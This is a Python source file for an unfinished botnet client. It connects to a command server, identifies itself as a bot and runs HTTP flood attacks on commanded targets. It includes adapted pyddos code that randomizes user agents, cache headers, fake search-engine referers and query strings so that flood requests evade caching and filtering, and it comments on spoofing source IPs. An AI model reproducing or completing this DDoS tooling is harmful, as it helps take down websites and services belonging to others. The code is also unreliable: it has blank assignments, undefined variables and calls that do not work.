import socket
import sys
import string
import http.client
from random import *
from threading import *


class Bot():

	def __init__(self, server: str, port: int):
		self.masterserver = server
		self.masterport = port
		self.sock: socket.socket = None
		self.masterserver: socket.socket = None
		
	def start(self):
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
		self.sock.connect((masterserver, masterport))
		#print if connect successful or not?
		#if not, then print error and close?
		self.sock.listen()        
		#recv request "whoami" right away?
		self.sock.send("iam:bot")
		try:
			while True:
				#wait for instructions
				#if message = attack type 1
					target =                        #target is IP/website from "attack" message?
					port = 
					t = RequestAttack(target, port)
					t.run()
				
				#if message = attack type 2

				#if message = disconnect, leave while loop
		
		except Exception as e:
			print(f'ran into an error:\n\t{e}')
		finally:
			self.sock.close()
			sys.exit()


	def attack2(self, host, port):
		#spoof source IP? fake_ip()

		#do attack on host:port


''' Original code from: Author: ___T7hM1___ Github: http://github.com/t7hm1/pyddos   '''

class RequestAttack():
	
	def __init__(self, target: str, port: int):
		self.target = target
		self.port = port

	def header(self):                                   
		cachetype = ['no-cache','no-store','max-age='+str(randint(0,10)),'max-stale='+str(randint(0,100)),'min-fresh='+str(randint(0,10)),'notransform','only-if-cache']
		acceptEc = ['compress,gzip','','*','compress;q=0,5, gzip;q=1.0','gzip;q=1.0, indentity; q=0.5, *;q=0']
		bot = self.add_bots()
		c = choice(cachetype)
		a = choice(acceptEc)
		http_header = {
			'User-Agent' : choice(self.add_useragent()),
			'Cache-Control' : c,
			'Accept-Encoding' : a,
			'Keep-Alive' : '42',
			'Host' : self.target,
			'Referer' : choice(bot)
		}
		return http_header
		
	def add_useragent(self):								### random useragents each time
		uagents = []
		uagents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36')
		uagents.append('(Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36')
		uagents.append('Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25')
		uagents.append('Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50')
		uagents.append('Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)')
		uagents.append('Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0')
		uagents.append('Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
		uagents.append('Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)')
		return uagents

	def add_bots(self):                                     ### random websites the request comes from
		bots = []
		bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
		bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
		return bots

	def rand_str(self):
		mystr=[]
		for x in range(3):
			chars = tuple(string.ascii_letters + string.digits)
			text = (choice(chars) for _ in range(randint(7,14)))
			text = ''.join(text)
			mystr.append(text)
		return '&'.join(mystr)                          ### randomstring = ___&___&___        
	
	def create_url(self):								### creates random url by adding '?' + randomstring
		return self.target + '?' + self.rand_str()

	def run(self):
		try:
			if port == 443:
				connection = http.client.HTTPSConnection(target, port)
				print("connected to %s %d" %(target, port))
			else:
				connection = http.client.HTTPConnection(target, port)
				print("connected to %s %d" %(target, port))
			
			url = self.create_url()
			http_header = self.header()
			method = 'GET' #method = choice(['get','post'])
			connection.request(method, url, None, http_header)
			response = connection.getresponse()
			print("Status: {} and reason: {}".format(response.status, response.reason))
			connection.close()
		except KeyboardInterrupt:
			sys.exit(print('Canceled by user'))
		except Exception as e:
			print(e)
			sys.exit()
			
''' End of referenced code'''
			
if __name__ == "__main__":
	server = 
	port = 
	bot = Bot(server, port)
	Bot.start()